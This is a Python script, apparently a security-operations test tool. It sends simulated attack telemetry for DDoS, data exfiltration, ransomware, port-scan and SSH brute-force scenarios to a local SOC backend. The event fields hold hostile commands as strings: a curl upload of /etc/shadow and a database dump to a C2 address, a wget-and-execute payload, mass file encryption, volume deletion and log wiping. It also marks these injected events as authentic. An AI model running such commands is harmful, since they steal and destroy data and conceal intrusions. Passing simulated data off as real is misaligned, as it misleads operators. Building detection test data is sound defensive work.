#!/usr/bin/env python3
"""
SOC Attack Scenario Simulator
Injects realistic attack events as authentic VM telemetry (is_simulated=False).

Usage:
  python3 scripts/simulate_attacks.py                       # all scenarios
  python3 scripts/simulate_attacks.py --scenario ddos
  python3 scripts/simulate_attacks.py --scenario exfiltration
  python3 scripts/simulate_attacks.py --scenario ransomware
  python3 scripts/simulate_attacks.py --scenario portscan
  python3 scripts/simulate_attacks.py --scenario brute_force
  python3 scripts/simulate_attacks.py --delay 0.3
"""

import sys, time, uuid, json, argparse, urllib.request, urllib.error
from datetime import datetime, timezone

SOC_URL    = "http://127.0.0.1:8000"
VM_ID      = "vm-endpoint-01"
API_KEY    = "VM-KEY-ENDPOINT-SEC-2026"
VM_IP      = "10.0.0.14"
ATTACKER_IP= "185.220.101.45"
C2_IP      = "198.51.100.23"
SCANNER_IP = "192.0.2.144"
DDOS_IPS   = ["45.142.212.100","91.108.4.200","5.188.206.15","194.165.16.82",
               "185.234.218.5","77.73.134.100","185.220.101.33","185.220.101.34"]

def now_iso():
    return datetime.now(timezone.utc).isoformat()

def post_telemetry(events):
    payload = json.dumps({"vm_id":VM_ID,"api_key":API_KEY,"events":events}).encode()
    req = urllib.request.Request(
        f"{SOC_URL}/api/vm/telemetry", data=payload,
        headers={"Content-Type":"application/json","X-VM-Key":API_KEY})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        print(f"  [!] HTTP {e.code}: {e.read().decode()}")
        return {}
    except Exception as e:
        print(f"  [!] {e}"); return {}

def send(ev, label, delay):
    ev.update({"timestamp":now_iso(),"host":ev.get("host",VM_ID),
               "destination_ip":ev.get("destination_ip",VM_IP),
               "source_type":"VM_ENDPOINT","collector_source":"attack-simulator"})
    r = post_telemetry([ev])
    print(f"  ✅ {label}  accepted={r.get('accepted','?')} queued={r.get('queued','?')}")
    time.sleep(delay)

# ── DDoS ──────────────────────────────────────────────────────────────────────
def scenario_ddos(d):
    print("\n🔴 [DDoS] Volumetric HTTP flood + UDP amplification")
    for i,ip in enumerate(DDOS_IPS):
        send({"event_type":"network_connection","severity":"HIGH","source_ip":ip,
              "destination_port":80,"protocol":"TCP",
              "command_line":f"GET / HTTP/1.1 — DDoS flood burst from botnet node {i+1}",
              "raw_payload":f"DDoS HTTP flood from {ip}:4{i}000 → {VM_IP}:80"}, f"DDoS HTTP flood {ip}", d)
    for i in range(6):
        ip=f"185.220.101.{33+i}"
        send({"event_type":"network_connection","severity":"CRITICAL","source_ip":ip,
              "destination_port":53,"protocol":"UDP",
              "command_line":f"UDP amplification/DNS reflection burst #{i+1}",
              "raw_payload":f"UDP DDoS reflection {ip}:53"}, f"UDP amplification #{i+1}", d)

# ── Exfiltration ───────────────────────────────────────────────────────────────
def scenario_exfiltration(d):
    print("\n🔴 [Exfiltration] Breach → stage → exfil sensitive data")
    send({"event_type":"authentication","severity":"CRITICAL","source_ip":C2_IP,
          "destination_port":22,"username":"ubuntu","file_action":"SUCCESS_POST_BURST",
          "command_line":f"sshd: Accepted password for ubuntu from {C2_IP} port 55123",
          "raw_payload":f"sshd[4421]: Accepted password for ubuntu from {C2_IP}"},
         "Attacker SSH login SUCCESS", d)
    send({"event_type":"privilege_escalation","severity":"CRITICAL","username":"ubuntu",
          "command_line":"sudo su - root",
          "raw_payload":"sudo: ubuntu : USER=root ; COMMAND=/bin/su - root"},
         "Sudo → root privilege escalation", d)
    send({"event_type":"process_execution","severity":"HIGH","username":"root",
          "process_name":"find",
          "command_line":"find /var/lib /home /etc -name '*.sql' -o -name '*.db' -o -name 'shadow'",
          "raw_payload":"find sensitive files for staging"}, "Attacker discovery: find *.sql *.db shadow", d)
    send({"event_type":"file_access","severity":"CRITICAL","username":"root",
          "file_path":"/var/backups/db_dump.sql","process_name":"tar",
          "command_line":"tar -czf /tmp/.hidden_exfil.tar.gz /var/backups/db_dump.sql /etc/passwd /etc/shadow",
          "file_action":"ARCHIVE","raw_payload":"tar -czf /tmp/.hidden_exfil.tar.gz db_dump + shadow"},
         "Data staging: tar archive DB + /etc/shadow", d)
    send({"event_type":"network_connection","severity":"CRITICAL","source_ip":VM_IP,
          "destination_ip":C2_IP,"destination_port":443,"protocol":"TCP","username":"root",
          "process_name":"curl",
          "command_line":f"curl -X POST https://{C2_IP}/upload --data-binary @/tmp/.hidden_exfil.tar.gz",
          "file_path":"/tmp/.hidden_exfil.tar.gz","file_action":"EXFILTRATE",
          "raw_payload":f"curl POST {C2_IP}:443 — outbound data exfiltration"},
         f"Data exfiltration via curl → {C2_IP}:443", d)
    send({"event_type":"process_execution","severity":"HIGH","username":"root","process_name":"rm",
          "command_line":"rm -rf /tmp/.hidden_exfil.tar.gz ~/.bash_history /var/log/auth.log",
          "raw_payload":"rm -rf artefacts to cover tracks"},
         "Cover tracks: rm -rf exfil + bash_history + auth.log", d)

# ── Ransomware ─────────────────────────────────────────────────────────────────
def scenario_ransomware(d):
    print("\n🔴 [Ransomware] LOLBin delivery → mass encrypt → ransom note")
    send({"event_type":"process_execution","severity":"HIGH","username":"ubuntu",
          "process_name":"wget",
          "command_line":"wget -q https://malware-c2-drop.xyz/locker.sh -O /tmp/.locker",
          "raw_payload":"wget malware payload → /tmp/.locker"},
         "Malware download via wget (LOLBin)", d)
    send({"event_type":"privilege_escalation","severity":"CRITICAL","username":"ubuntu",
          "command_line":"sudo chmod +x /tmp/.locker && sudo bash /tmp/.locker",
          "raw_payload":"sudo bash /tmp/.locker — ransomware exec"},
         "Ransomware execution with sudo", d)
    for ext in ["*.docx","*.pdf","*.sql","*.db","*.csv","*.xlsx","*.bak"]:
        send({"event_type":"file_access","severity":"CRITICAL","username":"root",
              "process_name":"openssl",
              "command_line":f"find /home /var -name '{ext}' -exec openssl enc -aes-256-cbc -k RANSOM_KEY {{}} \\;",
              "file_action":"ENCRYPT","raw_payload":f"openssl mass-encrypt {ext}"},
             f"File encryption: {ext}", d)
    send({"event_type":"process_execution","severity":"CRITICAL","username":"root",
          "process_name":"bash",
          "command_line":"vgremove -f $(vgdisplay | grep 'VG Name' | awk '{print $3}')",
          "file_action":"INHIBIT_SYSTEM_RECOVERY",
          "raw_payload":"vgremove -f — inhibit system recovery"},
         "Inhibit recovery: volume group deletion", d)
    send({"event_type":"file_access","severity":"CRITICAL","username":"root",
          "file_path":"/home/ubuntu/README_RANSOM.txt","process_name":"bash",
          "command_line":"echo 'YOUR FILES ARE ENCRYPTED. Pay 0.5 BTC to 1A1zP1...' > README_RANSOM.txt",
          "file_action":"CREATE","raw_payload":"Ransom note written to /home/ubuntu/README_RANSOM.txt"},
         "Ransom note dropped", d)

# ── Port Scan ──────────────────────────────────────────────────────────────────
def scenario_portscan(d):
    print("\n🔴 [Port Scan] External reconnaissance sweep across 17 ports")
    for port in [21,22,23,25,53,80,110,443,445,1433,3306,3389,5432,6379,8080,8443,27017]:
        sev = "HIGH" if port in [445,1433,3389,3306,27017] else "MEDIUM"
        send({"event_type":"network_connection","severity":sev,"source_ip":SCANNER_IP,
              "destination_port":port,"protocol":"TCP",
              "command_line":f"TCP SYN stealth scan probe → port {port}",
              "raw_payload":f"Nmap SYN scan {SCANNER_IP} → {VM_IP}:{port}"},
             f"Port scan probe → :{port}", d)

# ── Brute Force ────────────────────────────────────────────────────────────────
def scenario_brute_force(d):
    print("\n🔴 [Brute Force] SSH credential stuffing — 9 usernames × 4 attempts each")
    users = ["root","admin","ubuntu","pi","ec2-user","user","test","oracle","postgres"]
    for i,user in enumerate(users):
        for att in range(4):
            sev = "HIGH" if att >= 3 else "MEDIUM"
            send({"event_type":"authentication","severity":sev,"source_ip":ATTACKER_IP,
                  "destination_port":22,"source_port":49152+i*4+att,"username":user,
                  "file_action":"FAILED",
                  "command_line":f"sshd: Failed password for invalid user {user} from {ATTACKER_IP} port {49152+i*4+att} ssh2",
                  "raw_payload":f"sshd[{3000+i}]: Failed password for {user} from {ATTACKER_IP}"},
                 f"SSH fail #{att+1} user='{user}'", d)

# ── MAIN ───────────────────────────────────────────────────────────────────────
SCENARIOS = {"ddos":scenario_ddos,"exfiltration":scenario_exfiltration,
             "ransomware":scenario_ransomware,"portscan":scenario_portscan,
             "brute_force":scenario_brute_force}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="SOC Attack Simulator")
    ap.add_argument("--scenario", choices=list(SCENARIOS)+["all"], default="all")
    ap.add_argument("--delay", type=float, default=0.4)
    ap.add_argument("--host", default="http://127.0.0.1:8000")
    args = ap.parse_args()
    SOC_URL = args.host

    print("=" * 60)
    print("  SOC ATTACK SCENARIO SIMULATOR")
    print(f"  Target : {SOC_URL}")
    print(f"  VM     : {VM_ID} ({VM_IP})")
    print(f"  Delay  : {args.delay}s between events")
    print("=" * 60)

    try:
        with urllib.request.urlopen(f"{SOC_URL}/health", timeout=3) as r:
            print(f"  Backend: ONLINE ✅\n")
    except Exception as e:
        print(f"  [!] Backend not reachable: {e}"); sys.exit(1)

    to_run = list(SCENARIOS.items()) if args.scenario == "all" else [(args.scenario, SCENARIOS[args.scenario])]
    for name, fn in to_run:
        fn(args.delay)
        print(f"  ── '{name}' complete — pausing 2s for agent correlation...\n")
        time.sleep(2.0)

    print("=" * 60)
    print("  ✅ Done! Open http://localhost:3000 →")
    print("     Dashboard / Events / Incidents")
    print("     to see DDoS, Exfiltration, Ransomware & Port Scan")
    print("=" * 60)
